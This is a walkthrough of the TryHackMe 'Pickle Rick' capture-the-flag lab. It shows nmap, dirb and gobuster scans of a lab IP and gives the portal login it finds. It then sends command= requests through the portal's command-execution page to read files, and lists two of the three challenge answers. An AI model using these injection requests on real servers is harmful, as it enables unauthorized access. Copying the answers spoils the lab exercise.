# Pickle Rick CTF Walkthrough

## Challenge Overview
[Pickle Rick CTF](https://tryhackme.com/room/picklerick) is a Rick and Morty-themed challenge that requires exploiting a web server to find three hidden ingredients. These ingredients help Rick transform back into his human form.

### Deployment
- Deploy the virtual machine and access the web application at: `MACHINE_IP`

## Enumeration

### Nmap Scan
```
nmap -sC -A -Pn 10.10.52.134
```
**Findings:**
- Open ports:
  - **22/tcp** - SSH (OpenSSH 8.2p1 Ubuntu)
  - **80/tcp** - HTTP (Apache 2.4.41 Ubuntu)
- Web server title: `Rick is sup4r cool`

### Directory Enumeration with DIRB
```
dirb http://10.10.52.134
```
**Findings:**
- `/robots.txt` - Contains: `Wubbalubbadubdub`
- `/index.html` - Source code reveals username: `R1ckRul3s`
- `/server-status` - Forbidden (403)
- `/assets/` - Public directory

### Gobuster Scan
```
gobuster dir -u http://10.10.52.134/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -x .php
```
**Findings:**
- `/login.php` - Login page
- `/portal.php` - Redirects to login.php
- `/denied.php` - Redirects to login.php

## Exploitation

### Web Portal Login
- **Username:** `R1ckRul3s` (from `index.html` source code)
- **Password:** `Wubbalubbadubdub` (from `robots.txt`)
- **Successful login** redirects to `portal.php`

### Command Execution
- `portal.php` allows command execution.
- Commands are restricted, but using **BurpSuite Repeater**, we can modify the `command=` parameter to execute Linux commands.

### Finding the First Ingredient
- Listing files in the root directory:
  ```
  command=ls -la&sub=Execute
  ```
- **Findings:**
  - `Sup3rS3cretPickl3Ingred.txt`
  - `clue.txt`
- Viewing `Sup3rS3cretPickl3Ingred.txt`:
  ```
  command=less Sup3rS3cretPickl3Ingred.txt&sub=Execute
  ```
  **First ingredient:** `mr. meeseek hair`

### Finding the Second Ingredient
- Viewing `clue.txt`:
  ```
  command=less clue.txt&sub=Execute
  ```
  - Clue suggests searching the file system.
- Navigating to `/home/rick/`:
  ```
  command=ls -la /home/rick&sub=Execute
  ```
  - Found a directory named `second ingredients`.
- Viewing `second ingredients`:
  ```
  command=less "/home/rick/second ingredients"&sub=Execute
  ```
  **Second ingredient:** `1 jerry tear`

### Next Steps
- The third ingredient is still missing.
- Continue searching system files or escalating privileges to find the last ingredient.

## Conclusion
So far, we've gathered **two out of three** ingredients by leveraging directory enumeration, source code analysis, and command execution on the portal page. The next step is to find the final ingredient and complete the challenge.

